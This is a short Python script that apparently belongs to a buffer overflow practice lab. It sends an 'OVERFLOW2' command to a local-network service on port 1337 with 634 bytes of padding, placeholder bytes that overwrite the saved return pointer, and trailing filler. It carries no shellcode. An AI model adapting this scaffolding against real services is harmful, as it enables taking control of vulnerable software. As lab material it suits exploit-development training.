#!/usr/bin/env python3
import socket

ip = "192.168.112.135"
port = 1337

buf_length = 1100
prefix = "OVERFLOW2 "
offset = 634


buffer = ""
buffer += prefix						# prefix
buffer += "A" * (offset)					# padding
buffer += "BBBB"						# overwriting the saved return pointer
buffer += "CCCC"						# ESP value
buffer += "D" * (buf_length - (len(buffer) - len(prefix)))	# trail padding
buffer += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	s.connect((ip, port))
	print("[+] Sending evil buffer of {} bytes...".format((len(buffer) - len(prefix) - 2)))
	s.send(bytes(buffer, "latin-1"))
	print("[+] Done!")
except:
	print("[-] Unable to connect to the target.")

